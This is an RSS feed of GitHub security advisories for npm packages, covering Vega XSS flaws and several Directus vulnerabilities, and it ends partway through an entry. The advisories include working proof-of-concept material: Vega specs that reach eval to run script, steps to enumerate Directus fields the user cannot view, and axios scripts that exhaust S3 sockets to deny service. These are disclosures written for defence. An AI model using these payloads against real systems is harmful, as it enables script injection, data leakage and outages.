<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2025-03-27T18:01:34.878Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[vega-functions] Vega vulnerable to Cross-site Scripting via RegExp.prototype[@@replace]]]></title>
        <id>https://github.com/advisories/GHSA-963h-3v39-3pqf</id>
        <link href="https://github.com/advisories/GHSA-963h-3v39-3pqf"/>
        <updated>2025-03-27T18:00:25.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>Users running Vega/Vega-lite JSON definitions could run unexpected JavaScript code when drawing graphs, unless the library is used with the <code>vega-interpreter</code>.</p>
<h2 id="workarounds">Workarounds</h2>
<ul>
<li>Use <code>vega</code> with <a href="https://vega.github.io/vega/usage/interpreter/">expression interpreter</a></li>
<li>Upgrade to a <a href="https://github.com/vega/vega/releases/tag/v5.32.0">newer Vega version</a> (<code>5.32.0</code>)</li>
</ul>
<h3 id="poc-summary">POC Summary</h3>
<p>Calling <code>replace</code> with a <code>RegExp</code>-like pattern calls <code>RegExp.prototype[@@replace]</code>, which can then call an attacker-controlled <code>exec</code> function.</p>
<h3 id="poc-details">POC Details</h3>
<p>Consider the function call <code>replace('foo', {__proto__: /h/.constructor.prototype, global: false})</code>. Since <code>pattern</code> has <code>RegExp.prototype[@@replace]</code>, <code>pattern.exec('foo')</code> winds up being called.</p>
<p>The resulting malicious call looks like this:</p>
<pre><code>replace(&lt;string argument&gt;, {__proto__: /h/.constructor.prototype, exec: &lt;function&gt;, global: false})
</code></pre>
<p>Since functions cannot be returned from this, an attacker that wishes to escalate to XSS must abuse <code>event.view</code> to gain access to <code>eval</code>.</p>
<h3 id="reproduction-steps">Reproduction steps</h3>
<pre><code>{"$schema":"https://vega.github.io/schema/vega/v5.json","signals":[{"name":"a","on":[{"events":"body:mousemove{99999}","update":"replace('alert(1)',{__proto__:/h/.constructor.prototype,exec:event.view.eval,global:false})"}]}]}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vega/vega/security/advisories/GHSA-963h-3v39-3pqf">https://github.com/vega/vega/security/advisories/GHSA-963h-3v39-3pqf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27793">https://nvd.nist.gov/vuln/detail/CVE-2025-27793</a></li>
<li><a href="https://github.com/vega/vega/commit/694560c0aa576df8b6c5f0f7d202ac82233e6966">https://github.com/vega/vega/commit/694560c0aa576df8b6c5f0f7d202ac82233e6966</a></li>
<li><a href="https://github.com/vega/vega/releases/tag/v5.32.0">https://github.com/vega/vega/releases/tag/v5.32.0</a></li>
<li><a href="https://vega.github.io/vega/usage/interpreter">https://vega.github.io/vega/usage/interpreter</a></li>
<li><a href="https://github.com/advisories/GHSA-963h-3v39-3pqf">https://github.com/advisories/GHSA-963h-3v39-3pqf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-963h-3v39-3pqf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-27T18:00:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vega] Vega vulnerable to Cross-site Scripting via RegExp.prototype[@@replace]]]></title>
        <id>https://github.com/advisories/GHSA-963h-3v39-3pqf</id>
        <link href="https://github.com/advisories/GHSA-963h-3v39-3pqf"/>
        <updated>2025-03-27T18:00:25.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>Users running Vega/Vega-lite JSON definitions could run unexpected JavaScript code when drawing graphs, unless the library is used with the <code>vega-interpreter</code>.</p>
<h2 id="workarounds">Workarounds</h2>
<ul>
<li>Use <code>vega</code> with <a href="https://vega.github.io/vega/usage/interpreter/">expression interpreter</a></li>
<li>Upgrade to a <a href="https://github.com/vega/vega/releases/tag/v5.32.0">newer Vega version</a> (<code>5.32.0</code>)</li>
</ul>
<h3 id="poc-summary">POC Summary</h3>
<p>Calling <code>replace</code> with a <code>RegExp</code>-like pattern calls <code>RegExp.prototype[@@replace]</code>, which can then call an attacker-controlled <code>exec</code> function.</p>
<h3 id="poc-details">POC Details</h3>
<p>Consider the function call <code>replace('foo', {__proto__: /h/.constructor.prototype, global: false})</code>. Since <code>pattern</code> has <code>RegExp.prototype[@@replace]</code>, <code>pattern.exec('foo')</code> winds up being called.</p>
<p>The resulting malicious call looks like this:</p>
<pre><code>replace(&lt;string argument&gt;, {__proto__: /h/.constructor.prototype, exec: &lt;function&gt;, global: false})
</code></pre>
<p>Since functions cannot be returned from this, an attacker that wishes to escalate to XSS must abuse <code>event.view</code> to gain access to <code>eval</code>.</p>
<h3 id="reproduction-steps">Reproduction steps</h3>
<pre><code>{"$schema":"https://vega.github.io/schema/vega/v5.json","signals":[{"name":"a","on":[{"events":"body:mousemove{99999}","update":"replace('alert(1)',{__proto__:/h/.constructor.prototype,exec:event.view.eval,global:false})"}]}]}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vega/vega/security/advisories/GHSA-963h-3v39-3pqf">https://github.com/vega/vega/security/advisories/GHSA-963h-3v39-3pqf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27793">https://nvd.nist.gov/vuln/detail/CVE-2025-27793</a></li>
<li><a href="https://github.com/vega/vega/commit/694560c0aa576df8b6c5f0f7d202ac82233e6966">https://github.com/vega/vega/commit/694560c0aa576df8b6c5f0f7d202ac82233e6966</a></li>
<li><a href="https://github.com/vega/vega/releases/tag/v5.32.0">https://github.com/vega/vega/releases/tag/v5.32.0</a></li>
<li><a href="https://vega.github.io/vega/usage/interpreter">https://vega.github.io/vega/usage/interpreter</a></li>
<li><a href="https://github.com/advisories/GHSA-963h-3v39-3pqf">https://github.com/advisories/GHSA-963h-3v39-3pqf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-963h-3v39-3pqf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-27T18:00:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vega-functions] Vega Cross-Site Scripting (XSS) via event filter when not using CSP mode expressionInterpeter]]></title>
        <id>https://github.com/advisories/GHSA-rcw3-wmx7-cphr</id>
        <link href="https://github.com/advisories/GHSA-rcw3-wmx7-cphr"/>
        <updated>2025-03-27T14:12:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In <code>vega</code> 5.30.0 and lower,  <code>vega-functions</code> 5.15.0 and lower , it was possible to call JavaScript functions from the Vega expression language that were not meant to be supported.</p>
<h3 id="patches">Patches</h3>
<p>Patched in <code>vega</code> <code>5.31.0</code>  / <code>vega-functions</code> <code>5.16.0</code></p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<ul>
<li>Run <code>vega</code> without <code>vega.expressionInterpreter</code>. This mode is not the default as it is slower. </li>
<li>Using the interpreter <a href="https://vega.github.io/vega/usage/interpreter/">described in CSP safe mode</a> (Content Security Policy) prevents arbitrary Javascript from running, so users of this mode are not affected by this vulnerability.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>Reported to Vega-Lite by @kprevas Nov 8 2024 in <a href="https://github.com/vega/vega-lite/issues/9469">https://github.com/vega/vega-lite/issues/9469</a> &amp;  <a href="https://github.com/vega/vega/issues/3984">https://github.com/vega/vega/issues/3984</a></li>
</ul>
<p>Reproduction of the error in Vega by @mattijn </p>
<pre><code>{
  "$schema": "https://vega.github.io/schema/vega/v5.json",
  "signals": [
    {
      "name": "inject_alert",
      "on": [
        {
          "events": [
            {
              "type": "mousedown",
              "marktype": "rect",
              "filter": ["scale(event.view.setTimeout, 'alert(\"alert\")')"]
            }
          ],
          "update": "datum"
        }
      ]
    }
  ],
  "marks": [
    {
      "type": "rect",
      "encode": {
        "update": {
          "x": {"value": 0},
          "y": {"value": 0},
          "width": {"value": 100},
          "height": {"value": 100}
        }
      }
    }
  ]
}
</code></pre>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/vega/vega/security/advisories/GHSA-rcw3-wmx7-cphr">https://github.com/vega/vega/security/advisories/GHSA-rcw3-wmx7-cphr</a></li>
<li><a href="https://github.com/vega/vega-lite/issues/9469">https://github.com/vega/vega-lite/issues/9469</a></li>
<li><a href="https://github.com/vega/vega/issues/3984">https://github.com/vega/vega/issues/3984</a></li>
<li><a href="https://github.com/vega/vega/commit/8fc129a6f8a11e96449c4ac0f63de0e5bfc7254c">https://github.com/vega/vega/commit/8fc129a6f8a11e96449c4ac0f63de0e5bfc7254c</a></li>
<li><a href="https://github.com/advisories/GHSA-rcw3-wmx7-cphr">https://github.com/advisories/GHSA-rcw3-wmx7-cphr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rcw3-wmx7-cphr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-27T14:12:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vega] Vega Cross-Site Scripting (XSS) via event filter when not using CSP mode expressionInterpeter]]></title>
        <id>https://github.com/advisories/GHSA-rcw3-wmx7-cphr</id>
        <link href="https://github.com/advisories/GHSA-rcw3-wmx7-cphr"/>
        <updated>2025-03-27T14:12:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In <code>vega</code> 5.30.0 and lower,  <code>vega-functions</code> 5.15.0 and lower , it was possible to call JavaScript functions from the Vega expression language that were not meant to be supported.</p>
<h3 id="patches">Patches</h3>
<p>Patched in <code>vega</code> <code>5.31.0</code>  / <code>vega-functions</code> <code>5.16.0</code></p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<ul>
<li>Run <code>vega</code> without <code>vega.expressionInterpreter</code>. This mode is not the default as it is slower. </li>
<li>Using the interpreter <a href="https://vega.github.io/vega/usage/interpreter/">described in CSP safe mode</a> (Content Security Policy) prevents arbitrary Javascript from running, so users of this mode are not affected by this vulnerability.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>Reported to Vega-Lite by @kprevas Nov 8 2024 in <a href="https://github.com/vega/vega-lite/issues/9469">https://github.com/vega/vega-lite/issues/9469</a> &amp;  <a href="https://github.com/vega/vega/issues/3984">https://github.com/vega/vega/issues/3984</a></li>
</ul>
<p>Reproduction of the error in Vega by @mattijn </p>
<pre><code>{
  "$schema": "https://vega.github.io/schema/vega/v5.json",
  "signals": [
    {
      "name": "inject_alert",
      "on": [
        {
          "events": [
            {
              "type": "mousedown",
              "marktype": "rect",
              "filter": ["scale(event.view.setTimeout, 'alert(\"alert\")')"]
            }
          ],
          "update": "datum"
        }
      ]
    }
  ],
  "marks": [
    {
      "type": "rect",
      "encode": {
        "update": {
          "x": {"value": 0},
          "y": {"value": 0},
          "width": {"value": 100},
          "height": {"value": 100}
        }
      }
    }
  ]
}
</code></pre>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/vega/vega/security/advisories/GHSA-rcw3-wmx7-cphr">https://github.com/vega/vega/security/advisories/GHSA-rcw3-wmx7-cphr</a></li>
<li><a href="https://github.com/vega/vega-lite/issues/9469">https://github.com/vega/vega-lite/issues/9469</a></li>
<li><a href="https://github.com/vega/vega/issues/3984">https://github.com/vega/vega/issues/3984</a></li>
<li><a href="https://github.com/vega/vega/commit/8fc129a6f8a11e96449c4ac0f63de0e5bfc7254c">https://github.com/vega/vega/commit/8fc129a6f8a11e96449c4ac0f63de0e5bfc7254c</a></li>
<li><a href="https://github.com/advisories/GHSA-rcw3-wmx7-cphr">https://github.com/advisories/GHSA-rcw3-wmx7-cphr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rcw3-wmx7-cphr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-27T14:12:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[directus] Directus's webhook trigger flows can leak sensitive data]]></title>
        <id>https://github.com/advisories/GHSA-fm3h-p9wm-h74h</id>
        <link href="https://github.com/advisories/GHSA-fm3h-p9wm-h74h"/>
        <updated>2025-03-26T20:10:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="describe-the-bug">Describe the Bug</h3>
<p> In Directus, when a <strong>Flow</strong> with the "<em>Webhook</em>" trigger and the "<em>Data of Last Operation</em>" response body encounters a ValidationError thrown by a failed condition operation, the API response includes sensitive data. This includes environmental variables, sensitive API keys, user accountability information, and operational data.</p>
<p>This issue poses a significant security risk, as any unintended exposure of this data could lead to potential misuse.</p>
<p><img alt="Image" src="https://github.com/user-attachments/assets/fb894347-cd10-4e79-9469-8fc1b2289794">
<img alt="Image" src="https://github.com/user-attachments/assets/a20337a2-005f-4cfd-ba30-fc5f579ed6c4">
<img alt="Image" src="https://github.com/user-attachments/assets/9b776248-4a20-46f0-92a4-3760d8e53df9"></p>
<h3 id="to-reproduce">To Reproduce</h3>
<p><strong>Steps to Reproduce:</strong></p>
<ol>
<li>Create a Flow in Directus with:<ul>
<li>Trigger: Webhook</li>
<li>Response Body: Data of Last Operation</li>
</ul>
</li>
<li>Add a condition that is likely to fail.</li>
<li>Trigger the Flow with any input data that will fail the condition.</li>
<li>Observe the API response, which includes sensitive information like:<ul>
<li>Environmental variables (<code>$env</code>)</li>
<li>Authorization headers</li>
<li>User details under <code>$accountability</code></li>
<li>Previous operational data.</li>
</ul>
</li>
</ol>
<p><strong>Expected Behavior:</strong>
In the event of a ValidationError, the API response should only contain relevant error messages and details, avoiding the exposure of sensitive data.</p>
<p><strong>Actual Behavior:</strong>
The API response includes sensitive information such as:</p>
<ul>
<li>Environment keys (<code>FLOWS_ENV_ALLOW_LIST</code>)</li>
<li>User accountability (<code>role</code>, <code>user</code>, etc.)</li>
<li>Operational logs (<code>current_payments</code>, <code>$last</code>), which might contain private details.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-fm3h-p9wm-h74h">https://github.com/directus/directus/security/advisories/GHSA-fm3h-p9wm-h74h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30353">https://nvd.nist.gov/vuln/detail/CVE-2025-30353</a></li>
<li><a href="https://github.com/advisories/GHSA-fm3h-p9wm-h74h">https://github.com/advisories/GHSA-fm3h-p9wm-h74h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fm3h-p9wm-h74h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-26T20:08:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[directus] Directus `search` query parameter allows enumeration of non permitted fields]]></title>
        <id>https://github.com/advisories/GHSA-7wq3-jr35-275c</id>
        <link href="https://github.com/advisories/GHSA-7wq3-jr35-275c"/>
        <updated>2025-03-26T18:44:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>search</code> query parameter allows users with access to a collection to filter items based on fields they do not have permission to view. This allows the enumeration of unknown field contents.</p>
<h3 id="details">Details</h3>
<p>The searchable columns (numbers &amp; strings) are not checked against permissions when injecting the <code>where</code> clauses for applying the search query. This leads to the possibility of enumerating those un-permitted fields.</p>
<h3 id="poc">PoC</h3>
<ul>
<li>Create a collection with a string / numeric field, configure the permissions for the public role to not include the field created</li>
<li>Create items with identifiable content in the not permitted field</li>
<li>Query the collection and include the field content in the <code>search</code> parameter</li>
<li>See that results are returned, even tho the public user does not have permission to view the field content</li>
</ul>
<h3 id="impact">Impact</h3>
<p>This vulnerability is a very high impact, as for example Directus instances which allow public read access to the user avatar are vulnerable to have the email addresses, password hashes and potentially admin level access tokens extracted. The admin token and password hash extraction have a caveat, as string fields are only searched with a lower cased version of the search query.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-7wq3-jr35-275c">https://github.com/directus/directus/security/advisories/GHSA-7wq3-jr35-275c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30352">https://nvd.nist.gov/vuln/detail/CVE-2025-30352</a></li>
<li><a href="https://github.com/directus/directus/commit/ac5a9964d9926f20dc063a74cb417dc7bbad676d">https://github.com/directus/directus/commit/ac5a9964d9926f20dc063a74cb417dc7bbad676d</a></li>
<li><a href="https://github.com/advisories/GHSA-7wq3-jr35-275c">https://github.com/advisories/GHSA-7wq3-jr35-275c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7wq3-jr35-275c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-26T18:44:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[directus] Suspended Directus user can continue to use session token to access API]]></title>
        <id>https://github.com/advisories/GHSA-56p6-qw3c-fq2g</id>
        <link href="https://github.com/advisories/GHSA-56p6-qw3c-fq2g"/>
        <updated>2025-03-27T03:44:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Since the user status is not checked when verifying a session token a suspended user can use the token generated in session auth mode to access the API despite their status.</p>
<h3 id="details">Details</h3>
<p>There is a check missing in <code>verifySessionJWT</code> to verify that a user is actually still active and allowed to access the API. Right now one can extract the session token obtained by, e.g. login in to the app while still active and then, after the user has been suspended continue to use that token until it expires.</p>
<h3 id="poc">PoC</h3>
<ul>
<li>Create an active user</li>
<li>Log in with that user and note the session cookie</li>
<li>Suspend the user (and don't trigger an <code>/auth/refresh</code> call, as that invalidates the session</li>
<li>Access the API with <code>Authorization: Bearer &lt;token&gt;</code></li>
</ul>
<h3 id="impact">Impact</h3>
<p>This weakens the security of suspending users.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-56p6-qw3c-fq2g">https://github.com/directus/directus/security/advisories/GHSA-56p6-qw3c-fq2g</a></li>
<li><a href="https://github.com/directus/directus/commit/ef179931c55b50c110feca8404901d5633940771">https://github.com/directus/directus/commit/ef179931c55b50c110feca8404901d5633940771</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30351">https://nvd.nist.gov/vuln/detail/CVE-2025-30351</a></li>
<li><a href="https://github.com/advisories/GHSA-56p6-qw3c-fq2g">https://github.com/advisories/GHSA-56p6-qw3c-fq2g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-56p6-qw3c-fq2g</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-03-26T18:30:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[directus] Directus's S3 assets become unavailable after a burst of HEAD requests]]></title>
        <id>https://github.com/advisories/GHSA-rv78-qqrq-73m5</id>
        <link href="https://github.com/advisories/GHSA-rv78-qqrq-73m5"/>
        <updated>2025-03-27T03:42:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There's some tools that use Directus to sync content and assets.
Some of those tools use HEAD method, like Shopify, to check the existence of files.
Although, when making many HEAD requests at once, at some point, all assets are being served as 403.</p>
<h3 id="details">Details</h3>
<p>When I was investigating this issue, I have found that after the burst of HEAD requests, the amount of <code>sockets</code> held on <a href="https://github.com/smithy-lang/smithy-typescript/blob/main/packages/node-http-handler/src/node-http-handler.ts#L189">Agent on NodeHttpHandler</a> was always equal to <a href="https://github.com/directus/directus/blob/main/packages/storage-driver-s3/src/index.ts#L89"><code>STORAGE_CLOUD_MAX_SOCKETS</code></a> making it impossible to have new connections causing assets to be inaccessible.</p>
<p>After looking into this <a href="https://github.com/aws/aws-sdk-js-v3/issues/6691">issue on AWS SDK</a> I found that if the <a href="https://github.com/directus/directus/blob/main/api/src/services/assets.ts#L213">stream is requested</a>, it needs to be consumed otherwise will hang forever. And as can be <a href="https://github.com/directus/directus/blob/main/api/src/controllers/assets.ts#L233-L238">seen here</a> the stream is not consumed.</p>
<p>The <a href="https://github.com/directus/directus/blob/main/packages/storage-driver-s3/src/index.ts#L87-L88">timeouts set here</a>  had no noticeable effect on tests made.</p>
<h3 id="poc">PoC</h3>
<p>This can be easily reproduced with the following steps:</p>
<ul>
<li>setup AWS S3 storage</li>
<li>set STORAGE_CLOUD_MAX_SOCKETS: "50" (this value is lower than default for easier reproduction)</li>
<li>upload a file to your project</li>
<li>run this file (Replace the the file ID with the one you just uploaded):</li>
</ul>
<pre><code class="language-ts">import axios from "axios";

async function start() {
  Array.from({ length: 400 }, (_, i) =&gt; {
    axios
      .head(
        "http://localhost:8055/assets/e536aa35-3a81-4fa9-b856-3780584d38d8"
      )
      .then(() =&gt; console.log("✅"))
      .catch((e) =&gt;
        console.log("⛔", e.response?.status || e.code || e.message)
      );
  });
}

start();
</code></pre>
<p>Here's an example:</p>
<p><a href="https://github.com/user-attachments/assets/29d65bf0-5637-478f-a215-083c2ded3753">https://github.com/user-attachments/assets/29d65bf0-5637-478f-a215-083c2ded3753</a></p>
<h3 id="impact">Impact</h3>
<p>This causes denial of assets for all policies of Directus, including Admin and Public.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-rv78-qqrq-73m5">https://github.com/directus/directus/security/advisories/GHSA-rv78-qqrq-73m5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30350">https://nvd.nist.gov/vuln/detail/CVE-2025-30350</a></li>
<li><a href="https://github.com/advisories/GHSA-rv78-qqrq-73m5">https://github.com/advisories/GHSA-rv78-qqrq-73m5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rv78-qqrq-73m5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-26T17:20:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@directus/storage-driver-s3] Directus's S3 assets become unavailable after a burst of HEAD requests]]></title>
        <id>https://github.com/advisories/GHSA-rv78-qqrq-73m5</id>
        <link href="https://github.com/advisories/GHSA-rv78-qqrq-73m5"/>
        <updated>2025-03-27T03:42:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There's some tools that use Directus to sync content and assets.
Some of those tools use HEAD method, like Shopify, to check the existence of files.
Although, when making many HEAD requests at once, at some point, all assets are being served as 403.</p>
<h3 id="details">Details</h3>
<p>When I was investigating this issue, I have found that after the burst of HEAD requests, the amount of <code>sockets</code> held on <a href="https://github.com/smithy-lang/smithy-typescript/blob/main/packages/node-http-handler/src/node-http-handler.ts#L189">Agent on NodeHttpHandler</a> was always equal to <a href="https://github.com/directus/directus/blob/main/packages/storage-driver-s3/src/index.ts#L89"><code>STORAGE_CLOUD_MAX_SOCKETS</code></a> making it impossible to have new connections causing assets to be inaccessible.</p>
<p>After looking into this <a href="https://github.com/aws/aws-sdk-js-v3/issues/6691">issue on AWS SDK</a> I found that if the <a href="https://github.com/directus/directus/blob/main/api/src/services/assets.ts#L213">stream is requested</a>, it needs to be consumed otherwise will hang forever. And as can be <a href="https://github.com/directus/directus/blob/main/api/src/controllers/assets.ts#L233-L238">seen here</a> the stream is not consumed.</p>
<p>The <a href="https://github.com/directus/directus/blob/main/packages/storage-driver-s3/src/index.ts#L87-L88">timeouts set here</a>  had no noticeable effect on tests made.</p>
<h3 id="poc">PoC</h3>
<p>This can be easily reproduced with the following steps:</p>
<ul>
<li>setup AWS S3 storage</li>
<li>set STORAGE_CLOUD_MAX_SOCKETS: "50" (this value is lower than default for easier reproduction)</li>
<li>upload a file to your project</li>
<li>run this file (Replace the the file ID with the one you just uploaded):</li>
</ul>
<pre><code class="language-ts">import axios from "axios";

async function start() {
  Array.from({ length: 400 }, (_, i) =&gt; {
    axios
      .head(
        "http://localhost:8055/assets/e536aa35-3a81-4fa9-b856-3780584d38d8"
      )
      .then(() =&gt; console.log("✅"))
      .catch((e) =&gt;
        console.log("⛔", e.response?.status || e.code || e.message)
      );
  });
}

start();
</code></pre>
<p>Here's an example:</p>
<p><a href="https://github.com/user-attachments/assets/29d65bf0-5637-478f-a215-083c2ded3753">https://github.com/user-attachments/assets/29d65bf0-5637-478f-a215-083c2ded3753</a></p>
<h3 id="impact">Impact</h3>
<p>This causes denial of assets for all policies of Directus, including Admin and Public.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-rv78-qqrq-73m5">https://github.com/directus/directus/security/advisories/GHSA-rv78-qqrq-73m5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30350">https://nvd.nist.gov/vuln/detail/CVE-2025-30350</a></li>
<li><a href="https://github.com/advisories/GHSA-rv78-qqrq-73m5">https://github.com/advisories/GHSA-rv78-qqrq-73m5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rv78-qqrq-73m5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-26T17:20:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[directus] Directus's S3 assets become unavailable after a burst of malformed transformations]]></title>
        <id>https://github.com/advisories/GHSA-j8xj-7jff-46mx</id>
        <link href="https://github.com/advisories/GHSA-j8xj-7jff-46mx"/>
        <updated>2025-03-27T03:42:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When making many malformed transformation requests at once, at some point, all assets are being served as 403.</p>
<h3 id="details">Details</h3>
<p>When I was investigating this issue, I have found that after a burst of malformed asset transformation requests, the amount of <code>sockets</code> held on <a href="https://github.com/smithy-lang/smithy-typescript/blob/main/packages/node-http-handler/src/node-http-handler.ts#L189">Agent on NodeHttpHandler</a> was always equal to <a href="https://github.com/directus/directus/blob/main/packages/storage-driver-s3/src/index.ts#L89"><code>STORAGE_CLOUD_MAX_SOCKETS</code></a> making it impossible to have new connections causing assets to be inaccessible.</p>
<p>After looking into this <a href="https://github.com/aws/aws-sdk-js-v3/issues/6691">issue on AWS SDK</a> I found that if the <a href="https://github.com/directus/directus/blob/main/api/src/services/assets.ts#L213">stream is requested</a>, it needs to be consumed otherwise will hang forever. And as can be <a href="https://github.com/directus/directus/blob/main/api/src/services/assets.ts#L184">seen here</a> the stream is not consumed, because <code>sharp</code> will throw an error on the invalid arguments. For example <code>?height=xyz</code></p>
<p>The <a href="https://github.com/directus/directus/blob/main/packages/storage-driver-s3/src/index.ts#L87-L88">timeouts set here</a>  had no noticeable effect on tests made.</p>
<h3 id="poc">PoC</h3>
<p>This can be easily reproduced with the following steps:</p>
<ul>
<li>setup AWS S3 storage</li>
<li>set STORAGE_CLOUD_MAX_SOCKETS: "50" (this value is lower than default for easier reproduction)</li>
<li>upload a file to your project</li>
<li>run this file (Replace the the file ID with the one you just uploaded):</li>
</ul>
<pre><code class="language-ts">import axios from "axios";

async function start() {
  Array.from({ length: 400 }, (_, i) =&gt; {
    axios
      .get(
        "http://localhost:8055/assets/e536aa35-3a81-4fa9-b856-3780584d38d8?width=100&amp;height=XYZ"
      )
      .then(() =&gt; console.log("✅"))
      .catch((e) =&gt;
        console.log("⛔", e.response?.status || e.code || e.message)
      );
  });
}

start();
</code></pre>
<p>Here's an example:</p>
<p><a href="https://github.com/user-attachments/assets/7f5a6f51-1c51-4d4d-aa4f-c4953e91714c">https://github.com/user-attachments/assets/7f5a6f51-1c51-4d4d-aa4f-c4953e91714c</a></p>
<h3 id="impact">Impact</h3>
<p>This causes denial of assets for all policies of Directus, including Admin and Public.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-j8xj-7jff-46mx">https://github.com/directus/directus/security/advisories/GHSA-j8xj-7jff-46mx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30225">https://nvd.nist.gov/vuln/detail/CVE-2025-30225</a></li>
<li><a href="https://github.com/advisories/GHSA-j8xj-7jff-46mx">https://github.com/advisories/GHSA-j8xj-7jff-46mx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j8xj-7jff-46mx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-26T17:19:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@directus/storage-driver-s3] Directus's S3 assets become unavailable after a burst of malformed transformations]]></title>
        <id>https://github.com/advisories/GHSA-j8xj-7jff-46mx</id>
        <link href="https://github.com/advisories/GHSA-j8xj-7jff-46mx"/>
        <updated>2025-03-27T03:42:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When making many malformed transformation requests at once, at some point, all assets are being served as 403.</p>
<h3 id="details">Details</h3>
